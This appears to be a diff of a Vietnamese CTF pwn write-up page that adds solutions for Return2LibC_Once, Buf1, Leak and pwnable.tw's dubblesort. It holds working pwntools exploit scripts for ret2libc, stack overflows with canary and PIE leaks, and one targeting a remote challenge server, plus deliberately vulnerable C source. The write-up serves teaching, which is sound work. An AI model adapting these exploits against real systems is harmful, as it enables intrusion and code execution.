@@ -61,7 +61,7 @@ rop2 Rop2 - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006 Đầu tiên chú
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          10 min read
+          17 min read
         </div>
       </div>
     </header>
@@ -300,7 +300,296 @@ exploit()
 </code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_flag.png?raw=true" alt="img"></p>
 <h3 id="return2libc_once">Return2LibC_Once</h3>
 <h5 id="return2libc_once---x86---ret2libc-nc-4512224968-10011">Return2LibC_Once - x86 - ret2libc: nc 45.122.249.68 10011</h5>
-<h1 id="pwnabletw">PWNABLE.TW</h1>
+<p>File <a href="">BIN</a>, <a href="">LIBC</a></p>
+<p>Qua tới bài này rồi thì ta sẽ không ôn lại những kỹ thuật cũ nữa sẽ làm lẹ lẹ lẹ để đi ngủ .</p>
+<p>Làm thủ tục thì chúng ta thấy rằng, chỉ có NX là được bật và đây là 1 file 32 bit</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_checksec.png??raw=true" alt="img"></p>
+<p>Dùng IDA bắt lại và phân tích flow</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_IDA2.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_IDA.png??raw=true" alt="img"></p>
+<p>Ta rút ra được như sau :
++ Đề cho 2 file bin và lic =&gt; ret2libc
++ 32 bits
++ Dùng bof để exploit
++ Offset == 136</p>
+<p>Từ đó chúng ta sử dụng ret2libc để exploit thôi nào. Theo bước đầu tiên chúng ta phải tìm ra version libc nhưng lần này đã được cho trước, điều đó có nghĩa là chúng ta đã nắm được tất cả offset của file bin này, từ system function hay các hàm khác như gets, puts,&hellip;.</p>
+<p>Tiếp theo phải leak được GOT từ PLT của các hàm trong version libc đang sử dụng để tính toán ra libc base</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+example = elf.symbols[&#39;example&#39;]
+
+payload = paswd + b&#34;a&#34;*(136-len(paswd)) + b&#34;b&#34;*4 + p32(puts_plt) + p32(example) + p32(puts_got)
+</code></pre></div><p>Sau đó tính toán libc base và hoàn thành ROP</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">bincall = binsh + libc_base
+syscall = system + libc_base
+</code></pre></div><p>Sao đó gom hết những mảnh nho nhỏ trên lại ta được file exploit như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import * 
+
+context(arch = &#39;i386&#39;, os = &#39;linux&#39;, endian = &#39;little&#39;)
+BIN = &#34;./Return2LibC_Once&#34;
+elf = ELF(BIN)
+#libc = ELF(&#34;libc6_amd64.so&#34;)
+libc = ELF(&#34;/lib/i386-linux-gnu/libc-2.23.so&#34;)
+
+pop_edi = 0x0804861a # pop edi ; pop ebp ; ret
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+example = elf.symbols[&#39;example&#39;]
+
+print(hex(puts_plt))
+print(hex(puts_got))
+system = libc.symbols[&#39;system&#39;]
+print(system)
+binsh = next(libc.search(b&#39;/bin/sh\x00&#39;))
+print(binsh)
+ret = 0x08048362
+paswd = b&#34;CNSCzxc&#34;
+def exploit():
+	payload = paswd + b&#34;a&#34;*(136-len(paswd)) + b&#34;b&#34;*4 + p32(puts_plt) + p32(example) + p32(puts_got)
+	# __breakpoint=&#34;&#34;&#34;
+	# 	b*main+37
+	# 	&#34;&#34;&#34;
+	# gdb.attach(io, __breakpoint)
+	io.recvuntil(&#34;Welcome my ctf player. Tell me your password:&#34;)
+	io.sendline(payload)
+	io.recvuntil(&#34;No!&#34;)
+	print(io.recv())
+	puts = u32(io.recv()[0:4])
+	print(&#34;Puts leak : &#34;,hex(puts))
+	libc_base = puts-libc.symbols[&#39;puts&#39;]
+	print(&#34;Lib_base : &#34;,hex(libc_base))
+	#io.recvuntil(&#34;Welcome my ctf player. Tell me your password:&#34;)
+	bincall = binsh + libc_base
+	syscall = system + libc_base
+	print(bincall)
+	print(syscall)
+	payload = paswd + b&#34;a&#34;*(136-len(paswd)) + b&#34;b&#34;*4
+	payload += p32(pop_edi) + p32(system) + p32(bincall)
+	io.sendline(payload)
+	io.interactive()
+
+
+io = process(BIN)
+context.log_level=&#34;debug&#34;
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_shell.png??raw=true" alt="img"></p>
+<h3 id="buf1">Buf1</h3>
+<h6 id="heading"></h6>
+<p>Bắt đầu run thử ./buf1 xem sao:</p>
+<p>Khi nhập 1 string dài thì:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf1.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf2.png??raw=true" alt="img"></p>
+<p>Ồ đã có lỗi. Bây giờ mình xem code assembly nó xem sao nào</p>
+<p>Có hàm gets, đây là hàm đọc input, và chắc chắn nó gây ra lỗi. Tiếp tục bật IDA xem thử:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf3.png??raw=true" alt="img"></p>
+<p>Trong đây có 1 hàm Puts_flag:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf4.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf5.png??raw=true" alt="img"></p>
+<p>Khi check1 == 1, check2 ==2, check3 == 3 thì mình mới có flag! Vậy các biến check này đâu ra, tiếp tục xem trong IDA, ta thấy được 3 hàm như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf6.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf7.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf8.png??raw=true" alt="img"></p>
+<p>Từ đây mình có ý tưởng như sau: bây giờ chỉ cần set biến v0 = 1337, sau đó cho nó đi qua từng hàm một ở trên để các biến check được gán, sau đó Puts_flag là xong. Tiếp tục quay lại pwn_gdb để tìm cách thực thi nào~</p>
+<p>Mình đặt break point ở main+92 là ngay chỗ gets, để xem mình nhập input vào nó sẽ nằm đâu trong stack, từ đó để mình chèn payload vào!
+Mình nhập đoạn “aaaabbbbccccddddeeefff” để tiện kiểm tra xem. Show stack sau khi nhập:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf9.png??raw=true" alt="img"></p>
+<p>Tiếp tục dùng lệnh “ni” đến ret, ta thấy tham số truyền vào là 0x7ffff7e12e00 là ở vị trí df3c và df38:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf10.png??raw=true" alt="img"></p>
+<p>Đây là nơi mình truyền các địa chỉ hàm vào return address.
+Bây giờ bỏ qua bước gán các biến check, mình thử xem nó truyền vào được hàm không đã:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf11.png??raw=true" alt="img"></p>
+<p>Dùng lệnh “info functions”, mình có được tất cả địa chỉ của các hàm như sau:</p>
+<p>Bây giờ thử chạy lại và truyền vào hàm Func1 thử xem được không, đồng thời kiểm tra xem biến kiểm tra nằm ở vị trí nào?</p>
+<p>Đây là code thử để debug:</p>
+<p>Bắt đầu truyền payload vào để thực thi thì thấy thành công vào Func1. Xem assembly hàm Func1, ta thấy ở hàng &lt;+8&gt; sẽ dùng giá trị của địa chỉ rbp-0x4 để so sánh với 0x539 (1337 ở hệ cơ số 10).</p>
+<p>Kiểm tra giá trị rbp:</p>
+<p>Là đoạn eeeeffff mình nhập vào, bây giờ mình chỉ cần thay đổi thành 0x539 là oke.
+Vậy bài toán đã được giải quyết. Việc còn lại là truyền các địa chỉ của các hàm còn lại là xong.
+Code solve:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+#io = process(&#39;./buf1&#39;)
+io = remote(&#34;45.122.249.68&#34;, 10008)
+elf = ELF(&#39;./buf1&#39;)
+
+
+payload = b&#39;aaaabbbbccccddddeeee&#39; + p32(0x539) + p64(elf.sym[&#39;Func1&#39;]) + p64(elf.sym[&#39;Func2&#39;]) + p64(elf.sym[&#39;Func3&#39;]) + p64(elf.sym[&#39;Puts_flag&#39;])
+#print(payload)
+
+print(io.recv())
+pause()
+io.sendline(payload)
+print(io.recv())
+io.sendline(payload)
+
+#payload = p32(0x539) * 6 + p64(elf.sym[&#39;Func1&#39;]) + p64(elf.sym[&#39;Func2&#39;]) + p64(elf.sym[&#39;Func3&#39;]) + p64(elf.sym[&#39;Puts_flag&#39;])
+
+</code></pre></div><h3 id="leak">Leak</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+
+int xorlen = 0 ;
+int count = 0 ;
+int byte_count = 8;
+
+void Random(char *stringrandom){
+	FILE *fp;
+	fp = fopen(&#34;/dev/urandom&#34;, &#34;r&#34;);
+	fread(stringrandom, 1, byte_count, fp);
+	fclose(fp);
+}
+void Shell(){
+    system(&#34;/bin/sh&#34;);
+}
+
+void Welcome(){
+	puts(&#34;------------------------=--------------------------&#34;);
+    puts(&#34;Sao ke la nghia vu cua nguoi lam tu thien&#34;);
+	puts(&#34;------------------------=--------------------------&#34;);
+}
+void Read_Input(char *buf,unsigned int size){
+	int ret ;
+	ret = read(0,buf,size);
+	if(ret &lt;= 0){
+		puts(&#34;read error&#34;);
+		exit(1);
+	}
+}
+
+void Handler(int signum){
+	puts(&#34;Timeout&#34;);
+	_exit(1);
+}
+void init(){
+	setvbuf(stdout,0,_IONBF,0);
+	setvbuf(stdin,0,_IONBF,0);
+	setvbuf(stderr,0,_IONBF,0);
+	signal(SIGALRM,Handler);
+	alarm(180);
+}
+
+
+
+void Magic(){
+	puts(&#34;Toi biet chinh xac so tien ban nhan tu thien&#34;);
+	char str_random[8];
+	char mystr[8];
+	Random(&amp;str_random);
+	int index;
+	puts(&#34;Toi se cho ban 2 goi y de xem so tien toi sao ke duoc tu tai khoan nhan tu thian cua ban&#34;);
+	for(int i = 0; i &lt; 2; i++){
+		printf(&#34;\nvi tri: &#34;,i);
+		scanf(&#34;%d&#34;,&amp;index);
+		printf(&#34;Gia tri cho ban: &#34;);
+		write(1,&amp;str_random[index],1);
+	}
+	printf(&#34;\nNhap so tien ban da di lam tu thien: &#34;);
+	Read_Input(mystr,8);
+	if(!strncmp(str_random,mystr,8)){
+		puts(&#34;Đuoc roi ban hoan toan minh bach, chuc mung ban&#34;);
+	}
+	else{
+		puts(&#34;Ban da an chan tien tu thien, cong an se vao cuoc&#34;);
+	}
+	return;
+}
+int Vuln(){
+    char bof[128];
+	puts(&#34;Viet Nam se chien thang dai dich!!!&#34;);
+    read(0, bof, 200);
+	return 0;
+}
+void Menu(){
+	puts(&#34;1: Sao ke tien tu thien&#34;);
+	puts(&#34;2: bof&#34;);	
+}
+int main(){
+	init();
+    Welcome();
+	int choice;
+	while(1){
+		Menu();
+		scanf(&#34;%d&#34;,&amp;choice);
+		switch(choice){
+			case 1:
+				Magic();
+				break;
+			case 2:
+				Vuln();
+				break;
+			default:
+				puts(&#34;Chon sai roi!!!&#34;);
+				
+		}
+	}
+	return 0;	
+}
+</code></pre></div><p>Bài này đã cho sẵn source, sau khi dùng thủ tục để check thì ra thấy như sau :</p>
+<p>Các option protected đều được bật,&hellip; chà hơi gian nan đây, vậy công việc của chúng ta là phải leak đc canary và pie thì may ra mới có thể giải bài này. Nhưng leak bằng cách nào đây ???</p>
+<p>may sao code có chức năng cho chúng ta thấy giá trị ở vị trí chúng ta nhập trong stack, vậy thì quá hay, chúng ta chỉ cần tìm ra các offset nữa thôi.</p>
+<p>Lúc này đây thì gdb lên ngôi nhé, dựa vào kỹ năng dùng gdb thượng thừa vjproo gì đó thì chúng ta suy ra được offset của canary = 48, pie = 32 :D ảo ma canada qá nhỉ</p>
+<p>Nhưng thật ra các bạn phải debug gdb nhiều mới thấy được sự huyền diệu của nó :|</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+BIN = &#34;./leak&#34;
+
+# canary 48 
+#libc main 64
+
+def leakcanary():
+    off = 48
+    res = b&#39;&#39;
+    for i in range(8):
+        print(io.recv())
+        io.sendline(&#39;1&#39;)
+        print(io.recvuntil(&#39;vi tri: &#39;))
+        io.sendline(str(off+i))
+        print(io.recvuntil(&#39;Gia tri cho ban: &#39;))
+        res += io.recv(1)
+        print(io.recvuntil(&#39;vi tri: &#39;))
+        io.sendline(str(1))
+        print(io.recv())
+        io.sendline(str(1))
+    return u64(res)
+
+def leakpie():
+    off = 32
+    res = b&#39;&#39;
+    for i in range(8):
+        print(io.recv())
+        io.sendline(&#39;1&#39;)
+        print(io.recvuntil(&#39;vi tri: &#39;))
+        io.sendline(str(off+i))
+        print(io.recvuntil(&#39;Gia tri cho ban: &#39;))
+        res += io.recv(1)
+        print(io.recvuntil(&#39;vi tri: &#39;))
+        io.sendline(str(1))
+        print(io.recv())
+        io.sendline(str(1))
+    return u64(res) - 793
+
+
+
+def exploit():
+	canary = leakcanary()
+	shelladdr = leakpie() + 1
+
+	print(io.recv())
+	io.sendline(&#39;2&#39;)
+	payload = b&#39;A&#39;*136 + p64(canary)*2 + p64(shelladdr)
+	print(io.recv())
+	io.sendline(payload)
+	io.interactive()
+
+
+io = process(BIN)
+exploit()
+
+</code></pre></div><h1 id="pwnabletw">PWNABLE.TW</h1>
 <h2 id="start">Start</h2>
 <p>Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
 &hellip;..
@@ -371,6 +660,98 @@ print(&#34;[+]Esp address = &#34;, hex(esp_addr))
 payload = b&#39;A&#39; * 0x14 + p32(esp_addr + 0x14) + shellcode
 io.sendline(payload)
 io.interactive()
+</code></pre></div><h3 id="dubblesort">dubblesort</h3>
+<p>Chúng ta có một file 32 bit với canary và pie . Do đó, chúng ta có thể triển khai các hướng sau :</p>
+<p>Chúng ta phải tìm cách đọc bộ nhớ để có được các libc base của libc hoặc dubblesort =&gt; ret2libc</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/db_checksec.png??raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/db_checksec_IDA.png??raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  _BYTE *v4; // edi
+  unsigned int i; // esi
+  unsigned int j; // esi
+  int result; // eax
+  unsigned int v8; // [esp+18h] [ebp-74h] BYREF
+  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF
+  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
+  unsigned int v11; // [esp+7Ch] [ebp-10h]
+
+  v11 = __readgsdword(0x14u);
+  sub_8B5();
+  __printf_chk(1, &#34;What your name :&#34;);
+  read(0, buf, 0x40u);
+  __printf_chk(1, &#34;Hello %s,How many numbers do you what to sort :&#34;);
+  __isoc99_scanf(&#34;%u&#34;, &amp;v8);
+  v3 = v8;
+  if ( v8 )
+  {
+    v4 = v9;
+    for ( i = 0; i &lt; v8; ++i )
+    {
+      __printf_chk(1, &#34;Enter the %d number : &#34;);
+      fflush(stdout);
+      __isoc99_scanf(&#34;%u&#34;, v4);
+      v3 = v8;
+      v4 += 4;
+    }
+  }
+  sub_931(v9, v3);
+  puts(&#34;Result :&#34;);
+  if ( v8 )
+  {
+    for ( j = 0; j &lt; v8; ++j )
+      __printf_chk(1, &#34;%u &#34;);
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v11 )
+    sub_BA0();
+  return result;
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+BIN = &#34;./dubblesort&#34;
+elf = ELF(BIN)
+libc = ELF(&#34;./libc_32.so.6&#34;)
+system = libc.symbols[&#39;system&#39;]
+print(system)
+binsh = next(libc.search(b&#39;/bin/sh\x00&#39;))
+print(binsh)
+
+
+def exploit():
+	payload = b&#34;a&#34;*24
+	io.recvuntil(&#34;What your name :&#34;)
+	io.sendline(payload)
+	leak = u32(io.recv(4))
+	libc_base = leak - 0x0a - 0x1b0000
+	print(&#34;Libc base : &#34;,hex(libc_base))
+
+
+	syscall = libc_base + system
+	bincall = libc_base + binsh
+
+	print(&#34;System: &#34;, hex(syscall))
+	print(&#34;/Bin/sh: &#34;, hex(binsh))
+
+	io.recvuntil(&#34;How many numbers do you what to sort :&#34;)
+	io.sendline(b&#34;35&#34;)
+
+	for i in range(24):
+		io.recvuntil(&#34;number :&#34;)
+		io.sendline(b&#34;1&#34;)
+	for i in range(8):
+		io.recvuntil(&#34;number :&#34;)
+		io.sendline(p32(syscall))
+	for i in range(2):
+		io.recvuntil(&#34;number :&#34;)
+		io.sendline(p32(syscall))
+	io.interactive()
+
+io = process(BIN)
+exploit()
+
+
 </code></pre></div>
     </div>
     <div class="post-footer">
